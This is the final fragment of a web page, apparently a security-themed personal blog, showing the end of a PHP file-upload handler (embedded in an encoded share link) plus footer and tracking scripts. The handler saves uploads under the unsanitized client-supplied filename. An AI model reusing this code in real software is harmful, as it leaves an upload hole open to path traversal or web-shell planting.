%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%20%20%7B%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%20%20%3Cspan%20class=%22keyword%22%3Eecho%3C/span%3E%20$_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22name%22%3C/span%3E%5D%20.%20%3Cspan%20class=%22string%22%3E%22%20already%20exists.%20%22%3C/span%3E;%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%20%20%7D%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%3Cspan%20class=%22keyword%22%3Eelse%3C/span%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20class=%22comment%22%3E//%E5%B0%86%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E8%BD%AC%E7%A7%BB%E5%88%B0%E6%8C%87%E5%AE%9A%E5%AD%98%E6%94%BE%E6%96%87%E4%BB%B6%E5%A4%B9%3C/span%3E%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%20%20%7B%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%20%20move_uploaded_file($_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22tmp_name%22%3C/span%3E%5D,%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%20%20%3Cspan%20class=%22string%22%3E%22upload/%22%3C/span%3E%20.%20$_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22name%22%3C/span%3E%5D);%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%20%20%3Cspan%20class=%22keyword%22%3Eecho%3C/span%3E%20%3Cspan%20class=%22string%22%3E%22Stored%20in:%20%22%3C/span%3E%20.%20%3Cspan%20class=%22string%22%3E%22upload/%22%3C/span%3E%20.%20$_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22name%22%3C/span%3E%5D;%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%20%20%7D%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%7D%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%7D%3C/div%3E%3Cdiv%20class=%22line%22%3E%3Cspan%20class=%22keyword%22%3Eelse%3C/span%3E%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%7B%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%3Cspan%20class=%22keyword%22%3Eecho%3C/span%3E%20%3Cspan%20class=%22string%22%3E%22Invalid%20file%22%3C/span%3E;%20%20%20%20%3Cspan%20class=%22comment%22%3E//%E8%BF%94%E5%9B%9E%E6%97%A0%E6%95%88%E6%96%87%E4%BB%B6%E7%9A%84%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF%3C/span%3E%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%7D%3C/div%3E%3Cdiv%20class=%22line%22%3E%3Cspan%20class=%22meta%22%3E?%3E%3C/span%3E%3C/div%3E%3C/pre%3E%3C/td%3E%3C/tr%3E%3C/table%3E%3C/figure%3E"><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><ul><li id="toc"><a class="icon" href="#" onclick="if (!window.__cfRLUnblockHandlers) return false; return $(&quot;#toc-footer&quot;).toggle(),!1" data-cf-modified-2e4904e9c9ec2c3d24c6d64f-><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li><li id="share"><a class="icon" href="#" onclick="if (!window.__cfRLUnblockHandlers) return false; return $(&quot;#share-footer&quot;).toggle(),!1" data-cf-modified-2e4904e9c9ec2c3d24c6d64f-><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li><li id="top" style="display:none"><a class="icon" href="#" onclick="if (!window.__cfRLUnblockHandlers) return false; $(&quot;html, body&quot;).animate({scrollTop:0},&quot;fast&quot;)" data-cf-modified-2e4904e9c9ec2c3d24c6d64f-><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li><li id="menu"><a class="icon" href="#" onclick="if (!window.__cfRLUnblockHandlers) return false; return $(&quot;#nav-footer&quot;).toggle(),!1" data-cf-modified-2e4904e9c9ec2c3d24c6d64f-><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li></ul></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2018 Jing Ling</div><div class="footer-right"><nav><ul><li><a href="../../../../index.html">Home</a></li><li><a href="../../../../about/index.html">About</a></li><li><a href="../../../../link/index.html">Link</a></li><li><a href="../../../../tags/kali-linux/index.html">Kali</a></li><li><a href="../../../../archives/index.html">Archives</a></li><li><a href="https://github.com/sunnyelf">Projects</a></li><li><a href="../../../../search/index.html">Search</a></li></ul></nav></div></footer><script data-cfasync="false" src="../../../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="../../../../cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="2e4904e9c9ec2c3d24c6d64f-|49" defer></script></body></html><link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"><link href="https://cdn.bootcss.com/justifiedGallery/3.6.1/css/justifiedGallery.min.css" rel="stylesheet"><script src="https://cdn.bootcss.com/jquery/2.1.3/jquery.min.js" type="2e4904e9c9ec2c3d24c6d64f-text/javascript"></script><script src="https://cdn.bootcss.com/justifiedGallery/3.6.1/js/jquery.justifiedGallery.min.js" type="2e4904e9c9ec2c3d24c6d64f-text/javascript"></script><script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" type="2e4904e9c9ec2c3d24c6d64f-text/javascript"></script><script src="../../../../js/main.min.js" type="2e4904e9c9ec2c3d24c6d64f-text/javascript"></script><script type="2e4904e9c9ec2c3d24c6d64f-text/javascript">!function(e,a,t,n,c,o,s){e.GoogleAnalyticsObject=c,e[c]=e[c]||function(){(e[c].q=e[c].q||[]).push(arguments)},e[c].l=1*new Date,o=a.createElement(t),s=a.getElementsByTagName(t)[0],o.async=1,o.src="//www.google-analytics.com/analytics.js",s.parentNode.insertBefore(o,s)}(window,document,"script",0,"ga"),ga("create","UA-97495608-1","auto"),ga("send","pageview")</script><script type="2e4904e9c9ec2c3d24c6d64f-text/javascript">var disqus_shortname="sunnyelf";!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="//"+disqus_shortname+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)}()</script>